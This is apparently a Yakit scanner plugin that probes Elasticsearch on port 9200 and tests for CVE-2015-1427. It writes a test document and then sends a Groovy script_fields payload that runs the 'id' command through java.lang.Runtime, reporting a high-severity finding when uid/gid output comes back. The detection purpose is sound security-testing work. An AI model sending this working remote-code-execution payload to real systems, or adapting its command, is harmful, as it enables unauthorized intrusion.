# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

checkElastic = func(target,port){
    addr = str.HostPort(target, port)
    isHttps = str.IsTLSServer(addr)
    packet = `
GET / HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
If-Modified-Since: Tue, 28 Jun 2022 11:56:20 GMT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

`
   rspBytes,reqBytes,err =  poc.HTTP(
        packet, 
        poc.timeout(10),
        // # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        // poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "target": addr,
        },
    ))

    if !str.MatchAllOfSubString(rspBytes, "elasticsearch","number") {
        return
    }

     packet1 = `
POST /website/blog/ HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

{
  "name": "test"
}`
    rspBytes,reqBytes,err = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isHttps),
    poc.redirectTimes(0),
    )
    dump(rspBytes)
    if !str.MatchAllOfSubString(rspBytes, "HTTP/1.1 201 Created"){
        return
    }
     packet = `
POST /_search?pretty HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

{
  "script_fields": {
    "lupin": {
      "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  },
  "size": 1
}`

 rspBytes,reqBytes,err = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isHttps),
    poc.redirectTimes(0),
    )

    die(err)
   
    dump(rspBytes)
    if len(rspBytes) > 0 {
        if str.MatchAllOfRegexp(rspBytes, `uid=[0-9]+\(.*\) gid=[0-9]+\(.*\) groups=[0-9]+\(.*\)`){
            yakit.Info("%v found Elasticsearch沙盒绕过_CVE-2015-1427远程代码执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("Elasticsearch沙盒绕过_CVE-2015-1427远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("Elasticsearch沙盒绕过_CVE-2015-1427远程代码执行漏洞存在"),
            risk.type("RCE[Elasticsearch沙盒绕过]"),
            risk.details({
                    "target":addr,
                    "request":reqBytes,
                    "response":rspBytes,
                }),
        )
        }
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if result.Port != 9200 {
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        checkElastic(result.Target,result.Port) 
    }
    
}